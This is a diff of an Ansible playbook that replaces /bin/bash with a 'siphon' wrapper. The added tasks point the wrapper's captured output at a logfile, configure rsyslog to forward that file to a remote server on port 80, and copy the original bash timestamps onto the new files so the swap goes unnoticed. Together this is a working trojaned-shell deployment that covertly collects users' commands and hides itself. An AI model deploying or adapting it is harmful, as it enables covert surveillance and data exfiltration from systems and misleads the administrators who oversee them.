@@ -7,6 +7,7 @@
     file_to_replace: "/bin/bash"
     file_new_path: "/bin/ash"
     siphon_path: "/bin/siphon0"
+    logfile_path: "/output"
     server_ip: "192.168.1.1"
     server_port: "80"
 
@@ -66,6 +67,51 @@
     regexp: 'PORT'
     replace: '{{ server_port }}'
 
+- name: Replace logfile location in the script
+  ansible.builtin.replace:
+    path: {{ file_to_replace }}
+    regexp: '/outputfile'
+    replace: '{{ logfile_path }}'
+
+
+# RSYSLOG CONFIG
+# TODO - firewall?
+- name: Install rsyslog
+  ansible.builtin.apt:
+    name: rsyslog
+    state: present
+
+- name: Ensure rsyslog service is running
+  ansible.builtin.service:
+    name: rsyslog
+    state: started
+    enabled: yes
+
+- name: Configure rsyslog to send logfile to Graylog
+  ansible.builtin.copy:
+    dest: /etc/rsyslog.d/01-glogging.conf
+    content: |
+      input(type="imfile"
+            File="{{ logfile_path }}"
+            Tag="custom_log"
+            Severity="info"
+            Facility="local7")
+
+      # Output: Forward logs to Graylog server
+      *.* @{{ server_ip }}:{{ server_port }}
+    owner: root
+    group: root
+    mode: '0644'
+
+- name: Restart rsyslog
+  ansible.builtin.service:
+    name: rsyslog
+    state: restarted
+
+# Verify config
+# journalctl -f -u rsyslog
+
+# Cleanup
 - name: Apply original timestamps to wrapper
   command: >
     touch -d "{{ bash_timestamps.stdout_lines[0] }}" {{ file_new_path }}
